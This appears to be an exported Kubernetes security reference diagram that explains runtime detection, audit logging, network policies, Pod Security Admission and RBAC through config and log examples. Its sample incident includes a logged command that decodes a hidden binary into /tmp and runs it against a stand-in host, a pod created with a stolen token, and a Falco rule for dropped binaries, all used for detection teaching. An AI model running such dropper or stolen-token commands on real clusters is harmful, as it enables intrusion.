Use runtime security tooling to observe process execution, system calls, network connections, and other security-relevant activity inside workloads.
Correlate runtime events with Kubernetes metadata to identify which process, container, and workload caused suspicious activity.
Runtime visibility provides context that network telemetry alone cannot provide.

g.content:
<UserObject label="" help="Runtime Security (e.g., Tetragon)

Use eBPF-based runtime security to observe and control process execution, network activity, and other kernel-level behavior with Kubernetes workload context.

Tracing policies can provide targeted visibility and enforcement for security-sensitive runtime activity." tags="level-3 pri-2 Node Node.RuntimeSecurity _ _.Area _.Area.Cluster _.Area.NodeContext _.Area.RuntimeInstrumentation" slug="Tetragon" help.log.process_events="$ kubectl -n kube-system logs tetragon-p8x2z -c export-stdout | tetra getevents -o compact --pods cache-warmer
🚀 process shop/cache-warmer /bin/sh -c "echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA[…] | base64 -d > /tmp/.kworkerd && chmod +x /tmp/.kworkerd && /tmp/.kworkerd -d t.cdnx.example"
🚀 process shop/cache-warmer /usr/bin/base64 -d
💥 exit shop/cache-warmer /usr/bin/base64 -d 0
🚀 process shop/cache-warmer /usr/bin/chmod +x /tmp/.kworkerd
💥 exit shop/cache-warmer /usr/bin/chmod +x /tmp/.kworkerd 0
🚀 process shop/cache-warmer /tmp/.kworkerd -d t.cdnx.example"/>
g.data-help:
Runtime Security (e.g., Tetragon)
Use eBPF-based runtime security to observe and control process execution, network activity, and other kernel-level behavior with Kubernetes workload context.
Tracing policies can provide targeted visibility and enforcement for security-sensitive runtime activity.

g.content:
<UserObject label="" help="Runtime Threat Detection (e.g., Falco)

Use runtime threat detection to identify suspicious behavior such as unexpected process execution, privilege changes, sensitive file access, and unusual network activity.

Tune detection rules to the expected behavior of workloads and forward alerts to a central security monitoring system." tags="level-3 pri-2 Node Node.RuntimeSecurity _ _.Area _.Area.Cluster _.Area.NodeContext _.Area.RuntimeInstrumentation" slug="Falco" help.yaml.dropped_binary_rule="- rule: Dropped binary executed in container
 desc: A process started from a file written after the container started
 condition: >
 spawned_process and container
 and proc.is_exe_upper_layer = true
 output: >
 Dropped binary executed (exe=%proc.exepath cmdline=%proc.cmdline user=%user.name
 pod=%k8s.ns.name/%k8s.pod.name image=%container.image.repository digest=%container.image.digest)
 priority: CRITICAL
 tags: [container, process, mitre_execution, TA0002]" help.json.dropped_binary_alert="$ kubectl -n falco logs falco-7tq9d -c falco | grep 'Dropped binary' | jq -S '{time, rule, priority, hostname, output_fields}'
{
 "hostname": "worker-05",
 "output_fields": {
 "container.image.digest": "sha256:9d4bf569e737266d93655e630c601e8810000116f0681e70f489c347717bd590",
 "container.image.repository": "docker.io/library/debian",
 "evt.time": 1791949267512345678,
 "k8s.ns.name": "shop",
 "k8s.pod.name": "cache-warmer",
 "proc.cmdline": ".kworkerd -d t.cdnx.example",
 "proc.exepath": "/tmp/.kworkerd",
 "user.name": "root"
 },
 "priority": "Critical",
 "rule": "Dropped binary executed in container",
 "time": "2026-10-14T03:41:07.512345678Z"
}"/>
g.data-help:
Runtime Threat Detection (e.g., Falco)
Use runtime threat detection to identify suspicious behavior such as unexpected process execution, privilege changes, sensitive file access, and unusual network activity.
Tune detection rules to the expected behavior of workloads and forward alerts to a central security monitoring system.
g.data-help.yaml.dropped_binary_rule: - rule: Dropped binary executed in container desc: A process started from a file written after the container started condition: > spawned_process and container and proc.is_exe_upper_layer = true output: > Dropped binary executed (exe=%proc.exepath cmdline=%proc.cmdline user=%user.name pod=%k8s.ns.name/%k8s.pod.name image=%container.image.repository digest=%container.image.digest) priority: CRITICAL tags: [container, process, mitre_execution, TA0002]

g.content:
<UserObject label="<font style="font-size: 18px; color: rgb(51, 51, 51);"><b style="">?</b></font>" help="Node-Level Security

Some security controls operate at the Kubernetes node and Linux kernel level rather than inside individual pods or containers.

Node-level controls can provide visibility and enforcement across workloads, including network datapaths, process execution, system calls, and other kernel-observable activity." tags="level-3 info Node _ _.Area _.Area.Cluster" slug="NodeSecurity" help.shell.node_level_agents="# Node-level security agents run as DaemonSets: one pod per node
$ kubectl get ds -A
NAMESPACE NAME DESIRED CURRENT READY UP-TO-DATE AVAILABLE NODE SELECTOR AGE
falco falco 11 11 11 11 11 <none> 212d
kube-system cilium 11 11 11 11 11 kubernetes.io/os=linux 418d
kube-system tetragon 11 11 11 11 11 <none> 212d"/>
g.data-help:
Node-Level Security
Some security controls operate at the Kubernetes node and Linux kernel level rather than inside individual pods or containers.
Node-level controls can provide visibility and enforcement across workloads, including network datapaths, process execution, system calls, and other kernel-observable activity.

g.content:
<UserObject label="" help="Security Logging and Monitoring

Kubernetes security-relevant logs should be collected centrally and forwarded to a remote logging or SIEM platform such as Splunk for monitoring, correlation, alerting, and long-term retention.

Important sources include Kubernetes API audit logs, control-plane component logs, kubelet and container runtime logs, authentication and authorization events, admission controller decisions, CNI/network security logs, and security events generated by runtime detection tools.

Kubernetes Audit Logging is particularly important because it records requests made to the Kubernetes API, including who performed an action, which resource was accessed or modified, and whether the request was allowed or denied.

Logs should be stored outside the cluster or otherwise protected from workloads and compromised nodes to prevent attackers from modifying or deleting security evidence." tags="level-1 pri-2 Logging" slug="SecurityLogging" help.yaml.audit_policy="# kube-apiserver --audit-policy-file: metadata for secrets/configmaps, full request/response for pod and RBAC changes
apiVersion: audit.k8s.io/v1
kind: Policy
omitStages: ["RequestReceived"]
rules:
 - level: None
 users: ["system:kube-proxy"]
 verbs: ["watch"]
 - level: Metadata
 resources:
 - group: ""
 resources: ["secrets", "configmaps", "serviceaccounts/token"]
 - level: RequestResponse
 verbs: ["create", "patch", "update", "delete"]
 resources:
 - group: ""
 resources: ["pods", "pods/exec", "pods/ephemeralcontainers"]
 - group: "rbac.authorization.k8s.io"
 - level: Metadata" help.json.pod_create_audit_event="# Audit event: ServiceAccount storefront creates pod cache-warmer (request/response bodies left out)
# 201: created. PSA enforce=baseline passed; audit=restricted only records the violation.

Security Logging and Monitoring
Kubernetes security-relevant logs should be collected centrally and forwarded to a remote logging or SIEM platform such as Splunk for monitoring, correlation, alerting, and long-term retention.
Important sources include Kubernetes API audit logs, control-plane component logs, kubelet and container runtime logs, authentication and authorization events, admission controller decisions, CNI/network security logs, and security events generated by runtime detection tools.
Kubernetes Audit Logging is particularly important because it records requests made to the Kubernetes API, including who performed an action, which resource was accessed or modified, and whether the request was allowed or denied.
Logs should be stored outside the cluster or otherwise protected from workloads and compromised nodes to prevent attackers from modifying or deleting security evidence.

<UserObject label="<font style="font-size: 18px; color: rgb(51, 51, 51);"><b style="">?</b></font>" help="Multi-interface (Multus)

A pod can have multiple network interfaces using the Multus CNI plugin.
This allows attaching additional networks to a pod beyond the default CNI.

It is useful for scenarios like separating control and data planes, connecting to legacy networks, or assigning dedicated interfaces for specific protocols." tags="level-3 info Network Network.Cni Network.Cni.Multus _ _.Area _.Area.Cluster _.Area.Deployment _.Area.Pod" slug="Multus"/>
g.data-help:
Multi-interface (Multus)
A pod can have multiple network interfaces using the Multus CNI plugin. This allows attaching additional networks to a pod beyond the default CNI.
It is useful for scenarios like separating control and data planes, connecting to legacy networks, or assigning dedicated interfaces for specific protocols.

g.content:
<UserObject label="" help="Network interfaces (underlay)

Pods can use different types of network interfaces depending on requirements.
Containers can bind directly to the host interface, or use other means to communicate over vlans and such.

Be aware: underlay networks (e.g., macvlan) typically bypass Kubernetes NetworkPolicies.
Overlay networks used by most CNIs enforce policy as expected and are safer by default." tags="level-3 pri-2 Network Network.Cni _ _.Area _.Area.Cluster _.Area.Deployment _.Area.Pod" slug="Underlay"/>
g.data-help:
Network interfaces (underlay)
Pods can use different types of network interfaces depending on requirements. Containers can bind directly to the host interface, or use other means to communicate over vlans and such.
Be aware: underlay networks (e.g., macvlan) typically bypass Kubernetes NetworkPolicies. Overlay networks used by most CNIs enforce policy as expected and are safer by default.

g.content:
<UserObject label="" help="Host Networking

hostNetwork is technically neither overlay nor underlay networking. The pod shares the node’s network namespace and uses the node’s interfaces and IP addresses directly instead of receiving a normal pod network namespace.

This reduces network isolation, may bypass normal pod-level NetworkPolicy enforcement depending on the CNI, and can expose node-local services, interfaces, and ports to the workload.

Host networking should therefore normally be restricted and only allowed when explicitly required.

It goes mostly in/out the same way as underlay." tags="level-3 pri-2 Network Network.Cni Network.Cni.HostNetwork _ _.Area _.Area.Cluster _.Area.Deployment _.Area.Pod _.Area.NetworkUnderlay" slug="HostNetwork"/>
g.data-help:
Host Networking
hostNetwork is technically neither overlay nor underlay networking. The pod shares the node’s network namespace and uses the node’s interfaces and IP addresses directly instead of receiving a normal pod network namespace.
This reduces network isolation, may bypass normal pod-level NetworkPolicy enforcement depending on the CNI, and can expose node-local services, interfaces, and ports to the workload.
Host networking should therefore normally be restricted and only allowed when explicitly required.
It goes mostly in/out the same way as underlay.

g.content:
<UserObject label="<font style="font-size: 18px; color: rgb(51, 51, 51);"><b style="">?</b></font>" help="NetworkPolicy Enforcement

NetworkPolicies are applied to pods, not Kubernetes Services.
A policy selects pods using labels and controls the ingress and/or egress traffic allowed for those pods.

Enforcement happens on the pod network path and ultimately applies to traffic between pod IPs. This means the same policy applies whether traffic reaches a pod through a Service or connects directly to the pod IP.

Services may select the same pods for routing and load balancing, but they are not the enforcement point for NetworkPolicies." tags="level-2 info Network Network.Policy _ _.Area _.Area.Cluster _.Area.Deployment" slug="NetpolEnforce" help.yaml.allow_app_traffic="# Pods with app=storefront: in from ingress-nginx on 8080; out only to DNS and payments-proxy:443
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
 name: storefront-allow
 namespace: shop
spec:
 podSelector:
 matchLabels:
 app: storefront
 policyTypes:
 - Ingress
 - Egress
 ingress:
 - from:
 - namespaceSelector:
 matchLabels:
 kubernetes.io/metadata.name: ingress-nginx
 podSelector:
 matchLabels:
 app.kubernetes.io/name: ingress-nginx
 ports:
 - protocol: TCP
 port: 8080
 egress:
 - to:
 - namespaceSelector:
 matchLabels:
 kubernetes.io/metadata.name: kube-system
 podSelector:
 matchLabels:
 k8s-app: kube-dns
 ports:
 - protocol: UDP
 port: 53
 - protocol: TCP
 port: 53
 - to:
 - podSelector:
 matchLabels:
 app: payments-proxy
 ports:
 - protocol: TCP
 port: 443"/>
g.data-help:
NetworkPolicy Enforcement
NetworkPolicies are applied to pods, not Kubernetes Services. A policy selects pods using labels and controls the ingress and/or egress traffic allowed for those pods.
Enforcement happens on the pod network path and ultimately applies to traffic between pod IPs. This means the same policy applies whether traffic reaches a pod through a Service or connects directly to the pod IP.
Services may select the same pods for routing and load balancing, but they are not the enforcement point for NetworkPolicies.

g.content:
<UserObject label="" help="Egress

Egress policies control outbound traffic from pods using label selectors and destination IPs or CIDRs. These rules help prevent unauthorized external access.

Some CNIs support assigning dedicated egress IPs per namespace or pod, enabling traceability and firewall integration for outbound traffic control." tags="level-2 pri-3 Network Network.Egress _ _.Area _.Area.Cluster" slug="Egress" help.yaml.fixed_egress_node="# Traffic from payments-proxy to outside the cluster leaves through nodes labelled egress-gateway
apiVersion: cilium.io/v2
kind: CiliumEgressGatewayPolicy
metadata:
 name: payments-proxy-egress
spec:
 selectors:
 - podSelector:
 matchLabels:
 io.kubernetes.pod.namespace: shop
 app: payments-proxy
 destinationCIDRs:
 - 0.0.0.0/0
 excludedCIDRs:
 - 10.0.0.0/8
 egressGateway:
 nodeSelector:
 matchLabels:
 node-role.kubernetes.io/egress-gateway: """/>
g.data-help:
Egress
Egress policies control outbound traffic from pods using label selectors and destination IPs or CIDRs. These rules help prevent unauthorized external access.
Some CNIs support assigning dedicated egress IPs per namespace or pod, enabling traceability and firewall integration for outbound traffic control.
g.data-help.yaml.fixed_egress_node: # Traffic from payments-proxy to outside the cluster leaves through nodes labelled egress-gateway apiVersion: cilium.io/v2 kind: CiliumEgressGatewayPolicy metadata: name: payments-proxy-egress spec: selectors: - podSelector: matchLabels: io.kubernetes.pod.namespace: shop app: payments-proxy destinationCIDRs: - 0.0.0.0/0 excludedCIDRs: - 10.0.0.0/8 egressGateway: nodeSelector: matchLabels: node-role.kubernetes.io/egress-gateway: ""

g.content:
<UserObject label="" help="Traffic before filters

Traffic before reaching L7 filters (e.g., Envoy) is often encrypted with mTLS.
This makes payload inspection impossible, but metadata such as SNI, client identity, or source IP can still be used to enforce context-aware ACLs.

Use this metadata to apply fine-grained policies even when the content is opaque." tags="level-2 pri-2 Network Network.Ingress Network.Policy Network.Service Network.Service.EndpointSlice Network.Service.Port _ _.Area _.Area.Cluster _.Area.Deployment" slug="PreFilter"/>
g.data-help:
Traffic before filters
Traffic before reaching L7 filters (e.g., Envoy) is often encrypted with mTLS. This makes payload inspection impossible, but metadata such as SNI, client identity, or source IP can still be used to enforce context-aware ACLs.
Use this metadata to apply fine-grained policies even when the content is opaque.
g.data-tags: level-2 pri-2 Network Network.Ingress Network.Policy Network.Service Network.Service.EndpointSlice Network.Service.Port _ _.Area _.Area.Cluster _.Area.Deployment

ellipse.style: fill: light-dark(rgb(255, 209, 161), rgb(85, 46, 4)); stroke: light-dark(rgb(180, 95, 6), rgb(208, 135, 58));

g.content:
<UserObject label="" help="Traffic after filters

This is the raw, decrypted traffic that reaches the application after passing through L7 filters or service mesh proxies. At this point, the traffic is no longer encrypted and can be inspected or modified by sidecars or host-level tools before delivery to the application process.

Ensure that applications enforce their own validation and security controls, as traffic is now trusted and inside the protected boundary." tags="level-2 pri-3 Network Network.Ingress Network.Policy Network.Cni _ _.Area _.Area.Cluster _.Area.Deployment _.Area.Pod" slug="PostFilter"/>
g.data-help:
Traffic after filters
This is the raw, decrypted traffic that reaches the application after passing through L7 filters or service mesh proxies. At this point, the traffic is no longer encrypted and can be inspected or modified by sidecars or host-level tools before delivery to the application process.
Ensure that applications enforce their own validation and security controls, as traffic is now trusted and inside the protected boundary.
g.data-tags: level-2 pri-3 Network Network.Ingress Network.Policy Network.Cni _ _.Area _.Area.Cluster _.Area.Deployment _.Area.Pod

g.content:
<UserObject label="" help="Internal API communication

The Kubernetes API should only be accessible to internal system components, operators, and pods that explicitly require it.

Use default-deny NetworkPolicies to block access by default, and only allow specific namespaces or service accounts to communicate with the API server.
This minimizes the attack surface and enforces least privilege access." tags="level-1 pri-3 Api Api.Controllers _ _.Area _.Area.Cluster" slug="InternalApi" help.yaml.api_server_only_for_labelled_pods="# Every pod outside kube-system is denied the Kubernetes API, except pods that have the label api-access
# (a deny rule wins over any allow, so namespace policies can't open it again)
apiVersion: cilium.io/v2
kind: CiliumClusterwideNetworkPolicy
metadata:
 name: api-server-only-for-labelled-pods
spec:
 endpointSelector:
 matchExpressions:
 - key: io.kubernetes.pod.namespace
 operator: NotIn
 values: ["kube-system"]
 - key: api-access
 operator: DoesNotExist
 enableDefaultDeny:
 egress: false
 egressDeny:
 - toEntities:
 - kube-apiserver"/>
g.data-help:
Internal API communication
The Kubernetes API should only be accessible to internal system components, operators, and pods that explicitly require it.
Use default-deny NetworkPolicies to block access by default, and only allow specific namespaces or service accounts to communicate with the API server. This minimizes the attack surface and enforces least privilege access.
g.data-help.yaml.api_server_only_for_label: # Every pod outside kube-system is denied the Kubernetes API, except pods that have the label api-access # (a deny rule wins over any allow, so namespace policies can't open it again) apiVersion: cilium.io/v2 kind: CiliumClusterwideNetworkPolicy metadata: name: api-server-only-for-labelled-pods spec: endpointSelector: matchExpressions: - key: io.kubernetes.pod.namespace operator: NotIn values: ["kube-system"] - key: api-access operator: DoesNotExist enableDefaultDeny: egress: false egressDeny: - toEntities: - kube-apiserver

g.content:
<UserObject label="<font style="font-size: 18px; color: rgb(51, 51, 51);"><b style="">?</b></font>" help="Kubernetes objects

Everything in a cluster is an object created through the API: Deployments, Services, Secrets, NetworkPolicies, RBAC, custom resources. An object is desired state. Nothing runs just because it exists.

You typically create only a few objects yourself, with kubectl, GitOps, Helm or CI. Controllers create most of the others: a Deployment gets a ReplicaSet and the ReplicaSet gets Pods; a CronJob gets a new Job on every run and each Job gets Pods; an operator can turn one custom resource into many objects, cluster-scoped ones too.

Each of those objects is a new request to the API, made by the controller as itself. That is the feedback loop: one object leads to more, and every one of them is checked again. It is why Pod rules apply even if you only created a Deployment (the Pods are created later, by the replicaset-controller, and admission checks them then), and why a Deployment can exist while its Pods do not." tags="level-1 info Api Api.Objects _ _.Area _.Area.Cluster" slug="KubernetesObjects"/>
g.data-help:
Kubernetes objects
Everything in a cluster is an object created through the API: Deployments, Services, Secrets, NetworkPolicies, RBAC, custom resources. An object is desired state. Nothing runs just because it exists.
You typically create only a few objects yourself, with kubectl, GitOps, Helm or CI. Controllers create most of the others: a Deployment gets a ReplicaSet and the ReplicaSet gets Pods; a CronJob gets a new Job on every run and each Job gets Pods; an operator can turn one custom resource into many objects, cluster-scoped ones too.
Each of those objects is a new request to the API, made by the controller as itself. That is the feedback loop: one object leads to more, and every one of them is checked again. It is why Pod rules apply even if you only created a Deployment (the Pods are created later, by the replicaset-controller, and admission checks them then), and why a Deployment can exist while its Pods do not.

g.content:
<UserObject label="<font style="font-size: 18px; color: rgb(51, 51, 51);"><b style="">?</b></font>" help="Controllers

A controller is a program that watches objects through the API and works until the cluster matches them. This is the reconcile loop. kube-controller-manager runs the built-in ones (deployment-controller, replicaset-controller, cronjob-controller, job-controller, endpointslice-controller, ...). Operators such as cert-manager or Argo CD add their own.

A controller never writes to etcd and never creates anything directly. It sends ordinary API requests with its own identity, usually a ServiceAccount. Those requests go through authentication, RBAC and admission like any other. So a controller can only do what its RBAC allows, and admission policies (Pod Security Admission, Kyverno, Gatekeeper) still apply to what it creates. When a request is refused, nothing is created: the controller retries, and the reason shows up as events and in the status of the object it works on.

Security: controller ServiceAccounts are often powerful. Whoever can change the objects a controller acts on, or the controller itself, can make it create anything its RBAC allows." tags="level-1 info Api Api.Controllers _ _.Area _.Area.Cluster" slug="Controllers"/>
g.data-help:
Controllers
A controller is a program that watches objects through the API and works until the cluster matches them. This is the reconcile loop. kube-controller-manager runs the built-in ones (deployment-controller, replicaset-controller, cronjob-controller, job-controller, endpointslice-controller, ...). Operators such as cert-manager or Argo CD add their own.
A controller never writes to etcd and never creates anything directly. It sends ordinary API requests with its own identity, usually a ServiceAccount. Those requests go through authentication, RBAC and admission like any other. So a controller can only do what its RBAC allows, and admission policies (Pod Security Admission, Kyverno, Gatekeeper) still apply to what it creates. When a request is refused, nothing is created: the controller retries, and the reason shows up as events and in the status of the object it works on.
Security: controller ServiceAccounts are often powerful. Whoever can change the objects a controller acts on, or the controller itself, can make it create anything its RBAC allows.

g.content:
<UserObject label="" tags="level-2 pri-1 Namespace Namespace.Psa _ _.Area _.Area.Cluster _.Area.Namespace" help="Pod Security Admission (PSA)

Pod Security Admission (PSA) enforces a baseline security level for pods in a namespace by validating pod specs at admission time (before the pod is created).

It uses namespace labels to apply standard Pod Security profiles (privileged, baseline, restricted) and can block insecure settings such as privileged containers, excessive Linux capabilities, unsafe host access, or other risky pod configurations.

PSA is an important preventive control for reducing attack surface and stopping insecure workloads before they are deployed." slug="Psa" help.yaml.enforce_baseline_warn_restricted="# Namespace labels: enforce baseline, only warn and audit on restricted
apiVersion: v1
kind: Namespace
metadata:
 name: shop
 labels:
 pod-security.kubernetes.io/enforce: baseline
 pod-security.kubernetes.io/enforce-version: v1.34
 pod-security.kubernetes.io/warn: restricted
 pod-security.kubernetes.io/warn-version: v1.34
 pod-security.kubernetes.io/audit: restricted
 pod-security.kubernetes.io/audit-version: v1.34" help.log.warning_on_create="# cache-warmer.yaml: a Pod running docker.io/library/debian as root, no securityContext
$ kubectl --token="$STOLEN_TOKEN" create -f cache-warmer.yaml
Warning: would violate PodSecurity "restricted:v1.34": allowPrivilegeEscalation != false (container "cache-warmer" must set securityContext.allowPrivilegeEscalation=false), unrestricted capabilities (container "cache-warmer" must set securityContext.capabilities.drop=["ALL"]), runAsNonRoot != true (pod or container "cache-warmer" must set securityContext.runAsNonRoot=true), seccompProfile (pod or container "cache-warmer" must set securityContext.seccompProfile.type to "RuntimeDefault" or "Localhost")
pod/cache-warmer created"/>
g.data-help:
Pod Security Admission (PSA)
Pod Security Admission (PSA) enforces a baseline security level for pods in a namespace by validating pod specs at admission time (before the pod is created).
It uses namespace labels to apply standard Pod Security profiles (privileged, baseline, restricted) and can block insecure settings such as privileged containers, excessive Linux capabilities, unsafe host access, or other risky pod configurations.
PSA is an important preventive control for reducing attack surface and stopping insecure workloads before they are deployed.
g.data-help.yaml.enforce_baseline_warn_res: # Namespace labels: enforce baseline, only warn and audit on restricted apiVersion: v1 kind: Namespace metadata: name: shop labels: pod-security.kubernetes.io/enforce: baseline pod-security.kubernetes.io/enforce-version: v1.34 pod-security.kubernetes.io/warn: restricted pod-security.kubernetes.io/warn-version: v1.34 pod-security.kubernetes.io/audit: restricted pod-security.kubernetes.io/audit-version: v1.34
g.data-help.log.warning_on_create: # cache-warmer.yaml: a Pod running docker.io/library/debian as root, no securityContext $ kubectl --token="$STOLEN_TOKEN" create -f cache-warmer.yaml Warning: would violate PodSecurity "restricted:v1.34": allowPrivilegeEscalation != false (container "cache-warmer" must set securityContext.allowPrivilegeEscalation=false), unrestricted capabilities (container "cache-warmer" must set securityContext.capabilities.drop=["ALL"]), runAsNonRoot != true (pod or container "cache-warmer" must set securityContext.runAsNonRoot=true), seccompProfile (pod or container "cache-warmer" must set securityContext.seccompProfile.type to "RuntimeDefault" or "Localhost") pod/cache-warmer created

g.content:
<UserObject label="" help="ResourceQuota

ResourceQuota limits the total amount of cluster resources a namespace can consume (for example CPU, memory, storage, and object counts such as pods or services).

From a security and resilience perspective, quotas help reduce denial-of-service risk inside the cluster by preventing a single namespace or team from exhausting shared resources and impacting other workloads.

ResourceQuota is primarily a governance and availability control, but it also supports multi-tenancy and safer operations by enforcing usage bounds." tags="level-2 pri-2 Namespace Namespace.Quota _ _.Area _.Area.Cluster _.Area.Namespace" slug="ResourceQuota" help.yaml.limit_namespace_resources="# Caps for namespace shop: total CPU/memory, number of pods, and no LoadBalancer/NodePort Services
apiVersion: v1
kind: ResourceQuota
metadata:
 name: shop-quota
 namespace: shop
spec:
 hard:
 requests.cpu: "16"
 requests.memory: 32Gi
 limits.memory: 48Gi
 pods: "40"
 services.loadbalancers: "0"
 services.nodeports: "0"" help.shell.show_quota_usage="# Used vs. hard limit for each quota in the namespace
$ kubectl describe quota -n shop
Name: shop-quota
Namespace: shop
Resource Used Hard
-------- ---- ----
limits.memory 4352Mi 48Gi
pods 17 40
requests.cpu 3100m 16
requests.memory 2176Mi 32Gi
services.loadbalancers 0 0
services.nodeports 0 0"/>
g.data-help:
ResourceQuota
ResourceQuota limits the total amount of cluster resources a namespace can consume (for example CPU, memory, storage, and object counts such as pods or services).
From a security and resilience perspective, quotas help reduce denial-of-service risk inside the cluster by preventing a single namespace or team from exhausting shared resources and impacting other workloads.
ResourceQuota is primarily a governance and availability control, but it also supports multi-tenancy and safer operations by enforcing usage bounds.
g.data-help.yaml.limit_namespace_resources: # Caps for namespace shop: total CPU/memory, number of pods, and no LoadBalancer/NodePort Services apiVersion: v1 kind: ResourceQuota metadata: name: shop-quota namespace: shop spec: hard: requests.cpu: "16" requests.memory: 32Gi limits.memory: 48Gi pods: "40" services.loadbalancers: "0" services.nodeports: "0"

g.content:
<UserObject label="" help="LimitRange

LimitRange defines default and minimum/maximum resource requests and limits for containers and pods in a namespace (for example CPU and memory).

From a security and stability perspective, it helps prevent unsafe or unbounded workloads (such as containers with no limits) and improves cluster reliability by enforcing consistent resource settings.

LimitRange is mainly a stability and governance control, but it also supports safer multi-tenant operation by reducing resource abuse and misconfiguration." tags="level-2 pri-2 Namespace Namespace.Quota _ _.Area _.Area.Cluster _.Area.Namespace" slug="LimitRange" help.yaml.default_container_limits="# Containers without requests/limits get these defaults; more than 2Gi memory is rejected
apiVersion: v1
kind: LimitRange
metadata:
 name: shop-defaults
 namespace: shop
spec:
 limits:
 - type: Container
 defaultRequest:
 cpu: 100m
 memory: 128Mi
 default:
 memory: 256Mi
 max:
 memory: 2Gi" help.shell.show_limit_defaults="# Defaults applied to containers that set no requests/limits
$ kubectl describe limitrange -n shop
Name: shop-defaults
Namespace: shop
Type Resource Min Max Default Request Default Limit Max Limit/Request Ratio
---- -------- --- --- --------------- ------------- -----------------------
Container memory - 2Gi 128Mi 256Mi -
Container cpu - - 100m - -"/>
g.data-help:
LimitRange
LimitRange defines default and minimum/maximum resource requests and limits for containers and pods in a namespace (for example CPU and memory).
From a security and stability perspective, it helps prevent unsafe or unbounded workloads (such as containers with no limits) and improves cluster reliability by enforcing consistent resource settings.
LimitRange is mainly a stability and governance control, but it also supports safer multi-tenant operation by reducing resource abuse and misconfiguration.

g.content:
<UserObject label="" help="Default ServiceAccount

Every namespace has a default ServiceAccount (unless automountServiceAccountToken=false), and pods use it automatically unless another ServiceAccount is explicitly configured. From a security perspective, this matters because unintended API access can be granted if the default account has permissions or if service account tokens are auto-mounted unnecessarily." tags="level-2 pri-3 Namespace Namespace.DefaultSa _ _.Area _.Area.Cluster _.Area.Namespace" slug="DefaultSa" help.yaml.disable_token_automount="# Pods using the default ServiceAccount get no API token mounted
apiVersion: v1
kind: ServiceAccount
metadata:
 name: default
 namespace: shop
automountServiceAccountToken: false"/>
g.data-help:
Default ServiceAccount
Every namespace has a default ServiceAccount (unless automountServiceAccountToken=false), and pods use it automatically unless another ServiceAccount is explicitly configured. From a security perspective, this matters because unintended API access can be granted if the default account has permissions or if service account tokens are auto-mounted unnecessarily.
g.data-help.yaml.disable_token_automount: # Pods using the default ServiceAccount get no API token mounted apiVersion: v1 kind: ServiceAccount metadata: name: default namespace: shop automountServiceAccountToken: false

g.content:
<UserObject label="" tags="level-2 pri-1 Namespace Network Network.Policy _ _.Area _.Area.Cluster _.Area.Namespace" slug="NsDefaultDeny" help.yaml.deny_all_traffic="# Selects every pod in shop; no rules means no traffic in or out
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
 name: default-deny
 namespace: shop
spec:
 podSelector: {}
 policyTypes:
 - Ingress
 - Egress" help="Default deny NetworkPolicy

A namespace starts with no NetworkPolicy, and then every pod accepts traffic from everywhere in the cluster and can send traffic anywhere. A default-deny policy per namespace (an empty podSelector with policyTypes Ingress and Egress) flips that: only traffic that another policy allows gets through.

Add explicit allows on top: DNS to kube-dns, traffic from the ingress controller, and the few services each app needs. Without this, one compromised pod can reach every other pod and service in the cluster."/>
g.data-help.yaml.deny_all_traffic: # Selects every pod in shop; no rules means no traffic in or out apiVersion: networking.k8s.io/v1 kind: NetworkPolicy metadata: name: default-deny namespace: shop spec: podSelector: {} policyTypes: - Ingress - Egress
g.data-help:
Default deny NetworkPolicy
A namespace starts with no NetworkPolicy, and then every pod accepts traffic from everywhere in the cluster and can send traffic anywhere. A default-deny policy per namespace (an empty podSelector with policyTypes Ingress and Egress) flips that: only traffic that another policy allows gets through.
Add explicit allows on top: DNS to kube-dns, traffic from the ingress controller, and the few services each app needs. Without this, one compromised pod can reach every other pod and service in the cluster.

g.content:
<UserObject label="" tags="level-2 pri-1 Namespace Api Api.Rbac Api.Rbac.Binding _ _.Area _.Area.Cluster _.Area.Namespace" slug="NsTeamAccess" help.yaml.team_edit_access="# Group shop-developers gets the built-in edit role, only in namespace shop
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
 name: shop-developers-edit
 namespace: shop
subjects:
 - kind: Group
 name: shop-developers
 apiGroup: rbac.authorization.k8s.io
roleRef:
 apiGroup: rbac.authorization.k8s.io
 kind: ClusterRole
 name: edit" help.shell.check_team_permissions="# edit can exec into pods and add debug containers, but not change RBAC
$ kubectl auth can-i create rolebindings -n shop --as=jberg@fjordmart.example --as-group=shop-developers
no
$ kubectl auth can-i create pods/exec -n shop --as=jberg@fjordmart.example --as-group=shop-developers
yes
$ kubectl auth can-i patch pods/ephemeralcontainers -n shop --as=jberg@fjordmart.example --as-group=shop-developers
yes" help="Team access with RoleBindings

Give teams access to their namespace with a RoleBinding to a Role or to a built-in ClusterRole such as edit or view. A RoleBinding only grants rights inside its own namespace, even when it points to a ClusterRole.

Avoid ClusterRoleBindings for app teams, avoid giving them the admin role unless they should manage RBAC themselves, and never bind to the default ServiceAccount. Review who can create RoleBindings: that right lets someone grant themselves more."/>
g.data-tags: level-2 pri-1 Namespace Api Api.Rbac Api.Rbac.Binding _ _.Area _.Area.Cluster _.Area.Namespace
g.data-help.yaml.team_edit_access: # Group shop-developers gets the built-in edit role, only in namespace shop apiVersion: rbac.authorization.k8s.io/v1 kind: RoleBinding metadata: name: shop-developers-edit namespace: shop subjects: - kind: Group name: shop-developers apiGroup: rbac.authorization.k8s.io roleRef: apiGroup: rbac.authorization.k8s.io kind: ClusterRole name: edit
g.data-help.shell.check_team_permissions: # edit can exec into pods and add debug containers, but not change RBAC $ kubectl auth can-i create rolebindings -n shop --as=jberg@fjordmart.example --as-group=shop-developers no $ kubectl auth can-i create pods/exec -n shop --as=jberg@fjordmart.example --as-group=shop-developers yes $ kubectl auth can-i patch pods/ephemeralcontainers -n shop --as=jberg@fjordmart.example --as-group=shop-developers yes
g.data-help:
Team access with RoleBindings
Give teams access to their namespace with a RoleBinding to a Role or to a built-in ClusterRole such as edit or view. A RoleBinding only grants rights inside its own namespace, even when it points to a ClusterRole.
Avoid ClusterRoleBindings for app teams, avoid giving them the admin role unless they should manage RBAC themselves, and never bind to the default ServiceAccount. Review who can create RoleBindings: that right lets someone grant themselves more.

g.content:
<UserObject label="" tags="level-2 pri-3 Namespace _ _.Area _.Area.Cluster _.Area.Namespace" slug="NsLabels" help="Namespace labels

Labels on the namespace drive a lot of security: Pod Security Admission levels (pod-security.kubernetes.io/enforce), which admission policies apply, mesh injection, NetworkPolicy namespaceSelectors and cost or team ownership.

Treat them as configuration: set them from GitOps, and restrict who can change them, since changing a label can switch a control off."/>
g.data-help:
